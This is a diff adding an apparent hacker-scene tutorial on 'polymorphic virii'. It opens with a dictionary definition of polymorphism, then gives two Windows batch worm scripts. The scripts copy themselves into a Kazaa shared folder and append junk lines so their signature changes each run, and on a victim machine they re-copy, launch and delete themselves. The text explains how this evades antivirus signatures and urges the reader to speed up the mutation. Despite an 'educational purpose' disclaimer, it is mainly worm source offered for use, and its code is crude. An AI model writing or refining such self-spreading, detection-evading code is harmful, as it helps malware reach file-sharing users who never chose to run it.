@@ -1,0 +1,85 @@
+I TAKE NO RESPONSIBILITY FOR WHATEVER YOU DO!!!! FOR EDUCATIONAL PURPOSE ONLY (quickie disclaimer)
+
+
+
+Polymorphic virii...
+
+-----
+pol�y�mor�phism � �( P ) �Pronunciation Key �(pl-m�rfzm)
+n.
+
+1. Biology. The occurrence of different forms, stages, or types in individual organisms or in organisms of the same species, independent of sexual variations.
+
+2. Chemistry. Crystallization of a compound in at least two distinct forms. Also called pleomorphism.
+-----
+
+I will start out with a little source code. I know it's batch, and I know it's lame, but it's just an example.
+
+
+----cut here----
+@echo off
+if exist C:\progra~1\kazaa\myshar~1\example.bat goto line
+echo this example is for educational use only
+copy %0 C:\progra~1\kazaa\myshar~1\example.bat
+echo worming
+----cut here----
+
+
+It's a very simple code of a program that would (in theory) worm through kazaa and infect a couple of computers. Here's what an anti-virus company would do.
+
+1) The anti-virus company get's a couple of reports of a worm going through kazaa
+2) The anti-virus company get's hold of a copy of the worm
+3) The anti-virus company examines the worm and coms up with a solution, based on size, code, files and some other stuff
+4) The anti-virus company spreads the solution to the clients which dont have any trouble from the worm anymore
+
+So, let's say the code above would make a big hit and infect thousands of computers (which it won't), within a day there will be a fix for it, decreasing the chance it will survive in the wild.
+
+Now let's modify the code above.
+
+
+----cut here----
+@echo off
+if exist C:\progra~1\kazaa\myshar~1\example.bat goto line
+echo this example is for educational use only
+copy %0 C:\progra~1\kazaa\myshar~1\example.bat
+echo echo just spam >> C:\progra~1\kazaa\myshar~1\example.bat
+echo cls >> C:\progra~1\kazaa\myshar~1\example.bat
+echo worming
+goto end
+cls
+
+:line
+del C:\backup.bat
+copy %0 C:\backup.bat
+start C:\backup.bat
+del C:\progra~1\kazaa\myshar~1\example.bat
+:end
+cls
+
+----cut here----
+
+
+We have just made our batch worm polymorphic. Every time it is executed, it will either:
+
+1) Copy itself to the kazaa folder, add some useless lines and spread itself from kazaa or
+2) When a victim has downloaded it from kazaa, back the file up, delete the original virus file and move to step 1
+
+So: the virus will look like this after two times of running
+
+After 1st time running, sample from the kazaa folder
+----cut here----
+<virus code>
+echo just spam
+cls
+----cut here----
+
+After 2nd time running, sample from the kazaa folder
+----cut here----
+<virus code>
+echo just spam
+cls
+echo just spam
+cls
+----cut here----
+
+Now, When the virus adds 2 lines everytime it runs, it will take about 10 !?!?!? times to increase the file size with 1KB, so that would need a little bit of speeding up (which you will have to do yourself!).
